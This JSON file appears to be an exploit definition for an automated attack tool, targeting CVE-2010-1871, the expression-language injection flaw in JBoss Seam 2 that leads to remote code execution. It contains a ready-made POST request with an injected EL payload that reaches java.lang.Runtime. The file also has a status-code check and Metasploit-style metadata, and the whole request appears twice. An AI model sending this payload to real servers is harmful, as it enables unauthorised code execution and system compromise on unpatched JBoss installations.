{
   "description" : "\n\n            Versions of the JBoss Seam 2 framework < 2.2.1CR2 fails to properly\n\n            sanitize inputs to some JBoss Expression Language expressions.  As a\n\n            result, attackers can gain remote code execution through the\n\n            application server.  This module leverages RCE to upload and execute\n\n            a given payload.\n\n\n\n            Versions of the JBoss application server (AS) admin-console are\n\n            known to be vulnerable to this exploit, without requiring authentication.\n\n            Tested against JBoss AS 5 and 6, running on Linux with JDKs 6 and 7.\n\n\n\n            This module provides a more efficient method of exploitation - it\n\n            does not loop to find desired Java classes and methods.\n\n        ",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "type" : "MSF",
   "platform" : "MULTI",
   "title" : "JBoss Seam 2 File Upload and Execute",
   "\\\\\\\\\\\\\\\\" : "/",
   "references" : [
      "https://bugzilla.redhat.com/show_bug.cgi?id=615956",
      "http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html",
      "http://archives.neohapsis.com/archives/bugtraq/2013-05/0117.html"
   ],
   "msf_module" : "jboss_seam_upload_exec",
   "cve" : "CVE-2010-1871",
   "name" : "JbossSeamUploadExec",
   "informations" : {
      "PLATFORM" : "MULTI",
      "TYPE" : "MSF",
      "REFERENCES" : [
         "https://bugzilla.redhat.com/show_bug.cgi?id=615956",
         "http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html",
         "http://archives.neohapsis.com/archives/bugtraq/2013-05/0117.html"
      ],
      "MSF_MODULE" : "jboss_seam_upload_exec",
      "name" : "JbossSeamUploadExec",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "PATH" : "",
            "METHOD" : "POST",
            "HEADERS" : {
               "User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime')}",
            "TEXT" : "Sending Exploit #1 Request : [POST] /",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         }
      },
      "DESCRIPTION" : "\n\n            Versions of the JBoss Seam 2 framework < 2.2.1CR2 fails to properly\n\n            sanitize inputs to some JBoss Expression Language expressions.  As a\n\n            result, attackers can gain remote code execution through the\n\n            application server.  This module leverages RCE to upload and execute\n\n            a given payload.\n\n\n\n            Versions of the JBoss application server (AS) admin-console are\n\n            known to be vulnerable to this exploit, without requiring authentication.\n\n            Tested against JBoss AS 5 and 6, running on Linux with JDKs 6 and 7.\n\n\n\n            This module provides a more efficient method of exploitation - it\n\n            does not loop to find desired Java classes and methods.\n\n        ",
      "TITLE" : "JBoss Seam 2 File Upload and Execute",
      "\\\\\\\\\\\\\\\\" : "/",
      "CVE" : "CVE-2010-1871"
   },
   "detection" : {},
   "requests" : {
      "EXPLOIT1" : {
         "PATH" : "",
         "METHOD" : "POST",
         "HEADERS" : {
            "User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime')}",
         "TEXT" : "Sending Exploit #1 Request : [POST] /",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      }
   }
}
